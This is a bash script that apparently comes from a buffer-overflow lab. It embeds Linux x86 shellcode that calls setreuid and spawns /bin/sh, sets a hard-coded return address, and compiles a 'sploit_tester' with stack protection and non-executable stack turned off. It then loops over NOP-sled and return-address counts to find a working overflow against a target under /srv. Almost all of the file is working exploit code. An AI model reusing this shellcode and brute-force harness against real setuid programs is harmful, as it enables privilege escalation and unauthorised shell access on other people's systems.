#!/bin/bash

TARGET="/srv/target0"
BUFFER_SIZE=408
SHELLCODE_LENGTH=$(echo -ne "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" | wc -c)
MAX_NOP_COUNT=$(( ($BUFFER_SIZE - $SHELLCODE_LENGTH - 1) / 1 ))  # Assuming each NOP is 1 byte
RETURN_ADDRESS="\\x30\\xd3\\xff\\xff"  # 0xffffd330, ensure this is 4 bytes
RETURN_ADDRESS_LENGTH=4

compile_sploit() {
    gcc sploit_tester.c -o sploit_tester -fno-stack-protector -z execstack
}

run_sploit_tester() {
    for (( nop_count=0; nop_count<=$MAX_NOP_COUNT; nop_count++ )); do
        return_address_count=$(( ($BUFFER_SIZE - $SHELLCODE_LENGTH - 1 - $nop_count) / $RETURN_ADDRESS_LENGTH ))
        if [ $return_address_count -ge 0 ]; then
            ./sploit_tester $nop_count $return_address_count
            result=$?
            echo "Tested with NOP_COUNT=$nop_count, RETURN_ADDRESS_COUNT=$return_address_count, Result=$result"
            if [ $result -ne 0 ]; then
                echo "Process crashed with NOP_COUNT=$nop_count, RETURN_ADDRESS_COUNT=$return_address_count"
            fi
        fi
    done
}

echo "Compiling sploit_tester..."
compile_sploit
echo "Running sploit_tester with various combinations..."
run_sploit_tester
